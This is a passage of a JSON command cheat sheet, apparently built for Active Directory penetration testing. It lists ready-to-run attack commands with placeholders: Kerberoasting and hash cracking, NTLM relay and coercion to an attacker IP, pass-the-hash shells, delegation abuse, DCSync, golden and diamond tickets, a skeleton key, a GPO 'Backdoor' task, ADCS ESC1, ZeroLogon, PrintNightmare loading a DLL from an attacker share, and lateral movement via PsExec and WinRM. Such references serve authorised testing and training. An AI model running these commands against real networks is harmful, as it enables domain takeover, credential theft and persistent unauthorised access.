            "title": "Check LAPS Deployment",
            "cmd": "Get-DomainComputer -LDAPFilter '(ms-Mcs-AdmPwdExpirationTime=*)' | Select-Object dnshostname",
            "tags": [
              "tool"
            ],
            "desc": "Identify computers where LAPS is deployed"
          },
          {
            "title": "Impacket FindDelegation",
            "cmd": "impacket-findDelegation '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Find all delegation configurations using impacket"
          }
        ]
      },
      {
        "name": "ADCS Enumeration",
        "commands": [
          {
            "title": "Certify Find All",
            "desc": "Enumerate CAs",
            "cmd": ".\\Certify.exe find",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Certify Find Vulnerable",
            "desc": "Find vulnerable templates",
            "cmd": ".\\Certify.exe find /vulnerable",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Certipy Find Vulnerable",
            "desc": "Remote ADCS enum",
            "cmd": "certipy find -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip <DC_IP> -vulnerable",
            "tags": [
              "essential"
            ]
          }
        ]
      }
    ]
  },
  {
    "id": "ad-attacks",
    "name": "Active Directory Exploitation",
    "icon": "🎯",
    "description": "Attack Active Directory with Kerberos, NTLM relay, delegation, and persistence techniques",
    "subcategories": [
      {
        "name": "Kerberos Attacks",
        "commands": [
          {
            "title": "Kerberoasting (Impacket)",
            "cmd": "impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request -outputfile kerberoast_hashes.txt",
            "tags": [
              "essential"
            ],
            "desc": "Request TGS tickets for all SPNs and save hashes for cracking"
          },
          {
            "title": "Kerberoasting (Rubeus)",
            "cmd": "Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt",
            "tags": [
              "essential"
            ],
            "desc": "Request and dump TGS tickets for all Kerberoastable users"
          },
          {
            "title": "Kerberoast Specific User",
            "cmd": "Rubeus.exe kerberoast /user:<USER> /nowrap",
            "tags": [
              "tool"
            ],
            "desc": "Target a specific user for Kerberoasting"
          },
          {
            "title": "Crack Kerberoast Hashes",
            "cmd": "hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential"
            ],
            "desc": "Crack TGS-REP hashes (Kerberoast) with hashcat"
          },
          {
            "title": "AS-REP Roasting (Impacket)",
            "cmd": "impacket-GetNPUsers '<DOMAIN>/' -usersfile users.txt -dc-ip <DC_IP> -no-pass -outputfile asrep_hashes.txt",
            "tags": [
              "essential"
            ],
            "desc": "Extract AS-REP hashes for users without pre-auth"
          },
          {
            "title": "AS-REP Roasting (Rubeus)",
            "cmd": "Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt",
            "tags": [
              "essential"
            ],
            "desc": "Extract AS-REP hashes using Rubeus on Windows"
          },
          {
            "title": "Crack AS-REP Hashes",
            "cmd": "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential"
            ],
            "desc": "Crack AS-REP hashes with hashcat"
          },
          {
            "title": "Overpass the Hash (Rubeus)",
            "cmd": "Rubeus.exe asktgt /user:<USER> /rc4:<NTLM_HASH> /ptt",
            "tags": [
              "essential"
            ],
            "desc": "Request TGT using NTLM hash and inject into current session"
          },
          {
            "title": "Overpass the Hash (Impacket)",
            "cmd": "impacket-getTGT '<DOMAIN>/<USER>' -hashes :<NTLM_HASH> -dc-ip <DC_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Request TGT using NTLM hash and save to ccache file"
          },
          {
            "title": "Pass the Ticket (.kirbi)",
            "cmd": "Rubeus.exe ptt /ticket:<BASE64_TICKET>",
            "tags": [
              "essential"
            ],
            "desc": "Inject a Kerberos ticket into the current session"
          },
          {
            "title": "Pass the Ticket (.ccache)",
            "cmd": "export KRB5CCNAME=/path/to/ticket.ccache",
            "tags": [
              "essential"
            ],
            "desc": "Set ccache file for Linux Kerberos authentication"
          }
        ]
      },
      {
        "name": "NTLM Relay & Coercion",
        "commands": [
          {
            "title": "Responder LLMNR/NBT-NS Poisoning",
            "cmd": "sudo responder -I <INTERFACE> -dwPv",
            "tags": [
              "essential"
            ],
            "desc": "Poison LLMNR, NBT-NS, and MDNS to capture Net-NTLMv2 hashes"
          },
          {
            "title": "Responder (Analyze Mode)",
            "cmd": "sudo responder -I <INTERFACE> -A",
            "tags": [
              "tool"
            ],
            "desc": "Run Responder in analyze mode to see traffic without poisoning"
          },
          {
            "title": "NTLM Relay to SMB",
            "cmd": "impacket-ntlmrelayx -tf targets.txt -smb2support",
            "tags": [
              "essential"
            ],
            "desc": "Relay captured NTLM authentication to SMB targets for SAM dump"
          },
          {
            "title": "NTLM Relay to LDAP",
            "cmd": "impacket-ntlmrelayx -t ldap://<DC_IP> --delegate-access",
            "tags": [
              "essential"
            ],
            "desc": "Relay NTLM auth to LDAP and configure RBCD"
          },
          {
            "title": "NTLM Relay to LDAP (Shadow Creds)",
            "cmd": "impacket-ntlmrelayx -t ldap://<DC_IP> --shadow-credentials --shadow-target <TARGET_COMPUTER>$",
            "tags": [
              "advanced"
            ],
            "desc": "Relay to LDAP and add shadow credentials for PKINIT auth"
          },
          {
            "title": "NTLM Relay Execute Command",
            "cmd": "impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'",
            "tags": [
              "tool"
            ],
            "desc": "Relay NTLM auth and execute a command on the target"
          },
          {
            "title": "PetitPotam Coercion",
            "cmd": "python3 PetitPotam.py <ATTACKER_IP> <DC_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Coerce DC authentication via MS-EFSRPC (EFS)"
          },
          {
            "title": "PetitPotam (Authenticated)",
            "cmd": "python3 PetitPotam.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER_IP> <DC_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Coerce DC authentication with credentials"
          },
          {
            "title": "PrinterBug / SpoolSample",
            "cmd": "python3 printerbug.py '<DOMAIN>/<USER>:<PASS>'@<DC_IP> <ATTACKER_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Coerce authentication via MS-RPRN print spooler service"
          },
          {
            "title": "Coercer (All Methods)",
            "cmd": "python3 Coercer.py -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <ATTACKER_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Attempt all known coercion methods against a target"
          },
          {
            "title": "mitm6 IPv6 DNS Takeover",
            "cmd": "sudo mitm6 -d <DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc": "Perform IPv6 DNS takeover for NTLM relay via WPAD"
          },
          {
            "title": "mitm6 + ntlmrelayx Combo",
            "cmds": [
              "sudo mitm6 -d <DOMAIN>",
              "# In another terminal:",
              "impacket-ntlmrelayx -6 -t ldaps://<DC_IP> --delegate-access"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Combine mitm6 with ntlmrelayx for LDAP relay attack",
            "note": "Run mitm6 and ntlmrelayx in separate terminals"
          }
        ]
      },
      {
        "name": "Credential Relay",
        "commands": [
          {
            "title": "Crack Net-NTLMv2 Hash",
            "cmd": "hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential"
            ],
            "desc": "Crack captured Net-NTLMv2 hashes with hashcat"
          },
          {
            "title": "Crack NTLMv1 Hash",
            "cmd": "hashcat -m 5500 captured_hash.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ],
            "desc": "Crack captured NTLMv1 hashes with hashcat"
          },
          {
            "title": "NTLM Relay Interactive Shell",
            "cmd": "impacket-ntlmrelayx -tf targets.txt -smb2support -i",
            "tags": [
              "advanced"
            ],
            "desc": "Get an interactive SMB shell through NTLM relay"
          },
          {
            "title": "NTLM Relay Dump Secrets",
            "cmd": "impacket-ntlmrelayx -tf targets.txt -smb2support --dump-laps --dump-adcs --dump-gmsa",
            "tags": [
              "advanced"
            ],
            "desc": "Relay and dump LAPS, ADCS, and gMSA data"
          },
          {
            "title": "Generate Targets List (No SMB Signing)",
            "cmd": "crackmapexec smb <TARGET_RANGE> --gen-relay-list relay_targets.txt",
            "tags": [
              "essential"
            ],
            "desc": "Generate list of hosts without SMB signing for relay attacks"
          }
        ]
      },
      {
        "name": "Pass the Hash / Ticket",
        "commands": [
          {
            "title": "PtH with Impacket PsExec",
            "cmd": "impacket-psexec -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Pass the Hash via PsExec for SYSTEM shell"
          },
          {
            "title": "PtH with Impacket WMIExec",
            "cmd": "impacket-wmiexec -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Pass the Hash via WMI for semi-interactive shell"
          },
          {
            "title": "PtH with Impacket SMBExec",
            "cmd": "impacket-smbexec -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Pass the Hash via SMB service for SYSTEM shell"
          },
          {
            "title": "PtH with Impacket AtExec",
            "cmd": "impacket-atexec -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<TARGET_IP> 'whoami'",
            "tags": [
              "tool"
            ],
            "desc": "Pass the Hash via scheduled task execution"
          },
          {
            "title": "PtH with CrackMapExec",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -H <NTLM_HASH> -d <DOMAIN> -x 'whoami'",
            "tags": [
              "essential"
            ],
            "desc": "Pass the Hash and execute commands with CME"
          },
          {
            "title": "PtH with Evil-WinRM",
            "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>",
            "tags": [
              "essential"
            ],
            "desc": "Pass the Hash via WinRM for PowerShell access"
          },
          {
            "title": "Mimikatz Pass the Hash",
            "cmd": "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:cmd.exe",
            "tags": [
              "essential"
            ],
            "desc": "Inject NTLM hash into a new process with mimikatz"
          },
          {
            "title": "Import ccache Ticket",
            "cmd": "export KRB5CCNAME=/path/to/ticket.ccache && impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_HOSTNAME>",
            "tags": [
              "advanced"
            ],
            "desc": "Use a cached Kerberos ticket for authentication"
          }
        ]
      },
      {
        "name": "Delegation Exploitation",
        "commands": [
          {
            "title": "Unconstrained Delegation — Extract TGT",
            "cmd": "Rubeus.exe monitor /interval:5 /filteruser:<DC_HOSTNAME>$",
            "tags": [
              "essential"
            ],
            "desc": "Monitor for incoming TGTs on an unconstrained delegation host"
          },
          {
            "title": "Constrained Delegation — S4U (Rubeus)",
            "cmd": "Rubeus.exe s4u /user:<SERVICE_ACCT> /rc4:<NTLM_HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_HOSTNAME> /ptt",
            "tags": [
              "essential"
            ],
            "desc": "Abuse constrained delegation via S4U2Self and S4U2Proxy"
          },
          {
            "title": "Constrained Delegation — S4U (Impacket)",
            "cmd": "impacket-getST -spn cifs/<TARGET_HOSTNAME> -impersonate Administrator '<DOMAIN>/<SERVICE_ACCT>' -hashes :<NTLM_HASH> -dc-ip <DC_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Perform S4U attack with impacket for service ticket"
          },
          {
            "title": "RBCD Attack — Set msDS-AllowedToActOnBehalfOfOtherIdentity",
            "cmds": [
              "impacket-addcomputer '<DOMAIN>/<USER>:<PASS>' -computer-name 'FAKE01$' -computer-pass 'FakePass123!'",
              "impacket-rbcd '<DOMAIN>/<USER>:<PASS>' -delegate-to '<TARGET_COMPUTER>$' -delegate-from 'FAKE01$' -dc-ip <DC_IP> -action write",
              "impacket-getST -spn cifs/<TARGET_HOSTNAME> -impersonate Administrator '<DOMAIN>/FAKE01$:FakePass123!' -dc-ip <DC_IP>"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Full RBCD attack: add computer, set delegation, get ticket"
          },
          {
            "title": "RBCD via PowerShell",
            "cmds": [
              "Set-ADComputer <TARGET_COMPUTER> -PrincipalsAllowedToDelegateToAccount (Get-ADComputer FAKE01)",
              "Rubeus.exe s4u /user:FAKE01$ /rc4:<NTLM_HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_HOSTNAME> /ptt"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Configure RBCD via AD module and abuse with Rubeus"
          }
        ]
      },
      {
        "name": "Domain Persistence & Dominance",
        "commands": [
          {
            "title": "DCSync with Mimikatz",
            "cmd": "lsadump::dcsync /user:<DOMAIN>\\krbtgt",
            "tags": [
              "essential"
            ],
            "desc": "Replicate credentials from DC using directory replication rights"
          },
          {
            "title": "DCSync with Impacket",
            "cmd": "impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<DC_IP> -just-dc",
            "tags": [
              "essential"
            ],
            "desc": "Dump all domain hashes via DCSync with impacket"
          },
          {
            "title": "DCSync Specific User",
            "cmd": "impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<DC_IP> -just-dc-user krbtgt",
            "tags": [
              "essential"
            ],
            "desc": "DCSync only the krbtgt account hash"
          },
          {
            "title": "DCSync with Hashes",
            "cmd": "impacket-secretsdump -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<DC_IP> -just-dc-ntlm",
            "tags": [
              "tool"
            ],
            "desc": "DCSync using Pass the Hash for NTLM hashes only"
          },
          {
            "title": "Golden Ticket (Mimikatz)",
            "cmd": "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt",
            "tags": [
              "essential"
            ],
            "desc": "Forge a Golden Ticket and inject into current session"
          },
          {
            "title": "Golden Ticket (Impacket)",
            "cmd": "impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> Administrator",
            "tags": [
              "essential"
            ],
            "desc": "Forge a Golden Ticket ccache file"
          },
          {
            "title": "Silver Ticket (Mimikatz)",
            "cmd": "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_HOSTNAME> /service:cifs /rc4:<SERVICE_NTLM_HASH> /ptt",
            "tags": [
              "advanced"
            ],
            "desc": "Forge a Silver Ticket for a specific service"
          },
          {
            "title": "Diamond Ticket (Rubeus)",
            "cmd": "Rubeus.exe diamond /krbkey:<KRBTGT_AES256> /user:Administrator /domain:<DOMAIN> /dc:<DC_HOSTNAME> /enctype:aes256 /ptt",
            "tags": [
              "advanced"
            ],
            "desc": "Forge a Diamond Ticket by modifying a legitimate TGT"
          },
          {
            "title": "Skeleton Key",
            "cmd": "misc::skeleton",
            "tags": [
              "advanced"
            ],
            "desc": "Inject skeleton key into LSASS on DC — master password 'mimikatz'",
            "note": "Allows login as any user with password 'mimikatz' - lost on reboot"
          },
          {
            "title": "DCShadow Push Attribute",
            "cmds": [
              "lsadump::dcshadow /object:<TARGET_USER> /attribute:description /value:\"Pwned\"",
              "# In another mimikatz session:",
              "lsadump::dcshadow /push"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Push arbitrary AD changes by impersonating a domain controller"
          },
          {
            "title": "AdminSDHolder Persistence",
            "cmd": "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' -PrincipalIdentity <USER> -Rights All",
            "tags": [
              "advanced"
            ],
            "desc": "Add ACL to AdminSDHolder for persistent domain admin access",
            "note": "SDProp propagates permissions to all protected groups every 60 min"
          },
          {
            "title": "LAPS Abuse (CrackMapExec)",
            "cmd": "crackmapexec ldap <DC_IP> -u <USER> -p <PASS> -d <DOMAIN> --module laps",
            "tags": [
              "essential"
            ],
            "desc": "Dump LAPS passwords for all computers if authorized"
          },
          {
            "title": "Shadow Credentials Attack",
            "cmd": "python3 pywhisker.py -d <DOMAIN> -u <USER> -p <PASS> --target <TARGET_COMPUTER>$ --action add --dc-ip <DC_IP>",
            "tags": [
              "advanced"
            ],
            "desc": "Add shadow credentials to a computer object for PKINIT auth"
          },
          {
            "title": "DPAPI Master Key Extraction",
            "cmd": "impacket-dpapi backupkeys -t <DC_IP> -u <USER> -p <PASS>",
            "tags": [
              "advanced"
            ],
            "desc": "Extract DPAPI backup keys from the domain controller"
          },
          {
            "title": "Group Policy Abuse (SharpGPOAbuse)",
            "cmd": "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER> --GPOName \"Default Domain Policy\"",
            "tags": [
              "advanced"
            ],
            "desc": "Abuse writable GPO to add user as local admin on target machines"
          },
          {
            "title": "GPO Abuse Scheduled Task",
            "cmd": "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Backdoor' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c net localgroup administrators <USER> /add' --GPOName '<GPO_NAME>'",
            "tags": [
              "advanced"
            ],
            "desc": "Add scheduled task via writable GPO for code execution"
          },
          {
            "title": "Shadow Credentials (Whisker)",
            "cmd": "Whisker.exe add /target:<TARGET_COMPUTER>$ /domain:<DOMAIN> /dc:<DC_HOSTNAME>",
            "tags": [
              "advanced"
            ],
            "desc": "Add shadow credentials to a computer account using Whisker"
          },
          {
            "title": "Shadow Credentials + Rubeus PKINIT",
            "cmds": [
              "python3 pywhisker.py -d <DOMAIN> -u <USER> -p <PASS> --target <TARGET_COMPUTER>$ --action add --dc-ip <DC_IP>",
              "python3 gettgtpkinit.py <DOMAIN>/<TARGET_COMPUTER>$ <TARGET_COMPUTER>.ccache -cert-pfx <PFX_FILE> -pfx-pass <PFX_PASS>",
              "export KRB5CCNAME=<TARGET_COMPUTER>.ccache",
              "python3 getnthash.py <DOMAIN>/<TARGET_COMPUTER>$ -key <AS_REP_KEY>"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Full shadow credentials attack chain for computer account takeover"
          },
          {
            "title": "LAPS Abuse (PowerView)",
            "cmd": "Get-DomainComputer -Identity <TARGET_COMPUTER> -Properties ms-mcs-admpwd",
            "tags": [
              "essential"
            ],
            "desc": "Read LAPS password with PowerView if authorized"
          },
          {
            "title": "LAPS Abuse (LAPSToolkit)",
            "cmds": [
              "Import-Module .\\LAPSToolkit.ps1",
              "Get-LAPSComputers",
              "Find-LAPSDelegatedGroups"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Enumerate LAPS deployment and find who can read passwords"
          },
          {
            "title": "ADCS ESC1 (Certify)",
            "cmd": "Certify.exe find /vulnerable",
            "tags": [
              "essential"
            ],
            "desc": "Find vulnerable AD CS certificate templates (ESC1-ESC8)"
          },
          {
            "title": "ADCS ESC1 Request Cert",
            "cmd": "Certify.exe request /ca:<CA_SERVER>\\<CA_NAME> /template:<TEMPLATE_NAME> /altname:Administrator",
            "tags": [
              "essential"
            ],
            "desc": "Request certificate as Administrator via vulnerable template"
          },
          {
            "title": "ADCS Certipy Find",
            "cmd": "certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -vulnerable",
            "tags": [
              "essential"
            ],
            "desc": "Find vulnerable certificate templates with certipy"
          },
          {
            "title": "ADCS Certipy ESC1 Exploit",
            "cmds": [
              "certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -ca <CA_NAME> -template <TEMPLATE_NAME> -upn Administrator@<DOMAIN>",
              "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Full ESC1 attack: request certificate and authenticate"
          },
          {
            "title": "Diamond Ticket (Impacket)",
            "cmd": "python3 ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn krbtgt/<DOMAIN> Administrator",
            "tags": [
              "advanced"
            ],
            "desc": "Forge a Diamond Ticket using impacket"
          },
          {
            "title": "Coercer All Methods",
            "cmd": "python3 Coercer.py coerce -u <USER> -p <PASS> -d <DOMAIN> -t <TARGET_IP> -l <ATTACKER_IP> --always-continue",
            "tags": [
              "tool"
            ],
            "desc": "Try all known coercion methods against a target"
          },
          {
            "title": "DFSCoerce",
            "cmd": "python3 dfscoerce.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER_IP> <DC_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Coerce authentication via MS-DFSNM DFS service"
          },
          {
            "title": "ShadowCoerce",
            "cmd": "python3 shadowcoerce.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER_IP> <DC_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Coerce authentication via MS-FSRVP shadow copy service"
          },
          {
            "title": "noPac (SAM Account Name Spoofing)",
            "cmd": "python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> --impersonate Administrator -use-ldap -dump",
            "tags": [
              "advanced"
            ],
            "desc": "CVE-2021-42278/42287 - Spoof computer name for domain admin"
          },
          {
            "title": "Add Domain Admin (PowerView)",
            "cmds": [
              "Add-DomainGroupMember -Identity 'Domain Admins' -Members '<USER>'"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Add a user to Domain Admins if you have write access"
          },
          {
            "title": "ForceChangePassword (PowerView)",
            "cmd": "Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)",
            "tags": [
              "advanced"
            ],
            "desc": "Force reset a user's password if you have the permission"
          },
          {
            "title": "ZeroLogon CVE-2020-1472",
            "desc": "Reset DC password to empty",
            "cmd": "python3 zerologon_tester.py <DC_NAME> <DC_IP>",
            "tags": [
              "advanced"
            ],
            "note": "DANGEROUS: Can break AD"
          },
          {
            "title": "PrintNightmare",
            "desc": "RCE via Print Spooler",
            "cmd": "python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP> '\\\\<ATTACKER_IP>\\share\\payload.dll'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "noPac",
            "desc": "sAMAccountName spoofing",
            "cmd": "python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -shell",
            "tags": [
              "advanced"
            ]
          }
        ]
      },
      {
        "name": "ADCS Exploitation",
        "commands": [
          {
            "title": "Certipy ESC1",
            "desc": "Request cert as admin",
            "cmd": "certipy req -u <USER>@<DOMAIN> -p '<PASS>' -ca <CA> -template <TEMPLATE> -upn administrator@<DOMAIN> -dc-ip <DC_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Certipy Auth",
            "desc": "Auth with certificate",
            "cmd": "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "ntlmrelayx ADCS",
            "desc": "Relay to ADCS",
            "cmd": "impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE>",
            "tags": [
              "advanced"
            ]
          }
        ]
      }
    ]
  },
  {
    "id": "lateral-move",
    "name": "Lateral Movement Techniques",
    "icon": "↔️",
    "description": "Move laterally across the network using remote execution and Windows protocols",
    "subcategories": [
      {
        "name": "Impacket Execution",
        "commands": [
          {
            "title": "Impacket PsExec (Password)",
            "cmd": "impacket-psexec '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Remote shell via SMB service creation — returns SYSTEM"
          },
          {
            "title": "Impacket PsExec (Hash)",
            "cmd": "impacket-psexec -hashes :<NTLM_HASH> '<DOMAIN>/<USER>'@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "PsExec with Pass the Hash authentication"
          },
          {
            "title": "Impacket WMIExec",
            "cmd": "impacket-wmiexec '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Semi-interactive shell via WMI — runs as user, less noisy"
          },
          {
            "title": "Impacket SMBExec",
            "cmd": "impacket-smbexec '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Shell via SMB — similar to PsExec but different implementation"
          },
          {
            "title": "Impacket AtExec",
            "cmd": "impacket-atexec '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP> 'whoami'",
            "tags": [
              "tool"
            ],
            "desc": "Execute command via Task Scheduler service"
          },
          {
            "title": "Impacket DCOMExec",
            "cmd": "impacket-dcomexec '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Shell via DCOM (MMC20, ShellWindows, ShellBrowserWindow)"
          },
          {
            "title": "Impacket DCOMExec (Specific Object)",
            "cmd": "impacket-dcomexec -object MMC20 '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>",
            "tags": [
              "advanced"
            ],
            "desc": "Specify the DCOM object to use for execution"
          },
          {
            "title": "Impacket PsExec (Kerberos)",
            "cmd": "export KRB5CCNAME=<USER>.ccache && impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_HOSTNAME>",
            "tags": [
              "advanced"
            ],
            "desc": "PsExec using Kerberos ticket authentication"
          },
          {
            "title": "DCOMExec",
            "desc": "Execute via DCOM",
            "cmds": [
              "impacket-dcomexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>",
              "impacket-dcomexec -hashes <LM>:<NT> <DOMAIN>/<USER>@<TARGET_IP>"
            ],
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "WinRM & PowerShell Remoting",
        "commands": [
          {
            "title": "Evil-WinRM (Password)",
            "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'",
            "tags": [
              "essential"
            ],
            "desc": "Interactive PowerShell shell via WinRM with password"
          },
          {
            "title": "Evil-WinRM (Hash)",
            "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>",
            "tags": [
              "essential"
            ],
            "desc": "WinRM shell with Pass the Hash"
          },
          {
            "title": "Evil-WinRM (Key-Based)",
            "cmd": "evil-winrm -i <TARGET_IP> -c certificate.pem -k private_key.pem -S",
            "tags": [
              "advanced"
            ],
            "desc": "WinRM shell with certificate-based authentication"
          },
          {
            "title": "Evil-WinRM Upload File",
            "cmd": "upload /local/path/file.exe C:\\Temp\\file.exe",
            "tags": [
              "essential"
            ],
            "desc": "Upload a file to target via Evil-WinRM session"
          },
          {
            "title": "Evil-WinRM Download File",
            "cmd": "download C:\\Users\\<USER>\\Desktop\\flag.txt /local/path/",
            "tags": [
              "essential"
            ],
            "desc": "Download a file from target via Evil-WinRM session"
          },
          {
            "title": "Enter-PSSession (PowerShell)",
            "cmd": "Enter-PSSession -ComputerName <TARGET_HOSTNAME> -Credential <DOMAIN>\\<USER>",
            "tags": [
              "essential"
            ],
            "desc": "Interactive PowerShell remoting session"
          },
          {
            "title": "Invoke-Command (Single Host)",
            "cmd": "Invoke-Command -ComputerName <TARGET_HOSTNAME> -Credential $cred -ScriptBlock { whoami; hostname }",
            "tags": [
              "essential"
            ],
            "desc": "Execute commands on a remote host via PS remoting"
          },
          {
            "title": "Invoke-Command (Multiple Hosts)",
            "cmd": "Invoke-Command -ComputerName @('<HOST1>','<HOST2>','<HOST3>') -Credential $cred -ScriptBlock { whoami }",
            "tags": [
              "tool"
            ],
            "desc": "Execute commands on multiple remote hosts simultaneously"
          },
          {
            "title": "New-PSSession Persistent",
            "cmds": [
              "$session = New-PSSession -ComputerName <TARGET_HOSTNAME> -Credential $cred",
              "Enter-PSSession $session"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Create and enter a persistent PowerShell remoting session"
          },
          {
            "title": "WinRS Remote Command",
            "cmd": "winrs -r:<TARGET_HOSTNAME> -u:<USER> -p:<PASS> \"whoami\"",
            "tags": [
              "tool"
            ],
            "desc": "Execute command remotely via Windows Remote Shell"
          },
          {
            "title": "Invoke-Command Multi",
            "desc": "Execute on multiple targets",
            "cmd": "Invoke-Command -ComputerName <TARGET1>,<TARGET2> -ScriptBlock { whoami } -Credential <DOMAIN>\\<USER>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "New-PSSession + Copy",
            "desc": "Create session and copy files",
            "cmds": [
              "$s = New-PSSession -ComputerName <TARGET_IP> -Credential <DOMAIN>\\<USER>",
              "Copy-Item -Path C:\\local\\file -Destination C:\\temp\\file -ToSession $s",
              "Enter-PSSession $s"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "runas /netonly",
            "desc": "Run with different domain creds",
            "cmd": "runas /netonly /user:<DOMAIN>\\<USER> cmd.exe",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Windows Remote Services",
        "commands": [
          {
            "title": "PsExec.exe (Sysinternals)",
            "cmd": "PsExec.exe \\\\<TARGET_IP> -u <DOMAIN>\\<USER> -p <PASS> -accepteula cmd.exe",
            "tags": [
              "essential"
            ],
            "desc": "Remote execution using Sysinternals PsExec binary"
          },
          {
            "title": "PsExec.exe as SYSTEM",
            "cmd": "PsExec.exe \\\\<TARGET_IP> -u <DOMAIN>\\<USER> -p <PASS> -s -accepteula cmd.exe",
            "tags": [
              "essential"
            ],
            "desc": "Run remote command as SYSTEM with PsExec"
          },
          {
            "title": "Remote Service Creation (sc.exe)",
            "cmds": [
              "sc \\\\<TARGET_IP> create remotesvc binpath= \"cmd.exe /c <COMMAND>\"",
              "sc \\\\<TARGET_IP> start remotesvc",
              "sc \\\\<TARGET_IP> delete remotesvc"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Create and start a remote service for command execution"
          },
          {
            "title": "Remote Scheduled Task",
            "cmds": [
              "schtasks /create /s <TARGET_IP> /u <USER> /p <PASS> /tn \"TaskName\" /tr \"cmd.exe /c <COMMAND>\" /sc once /st 00:00",
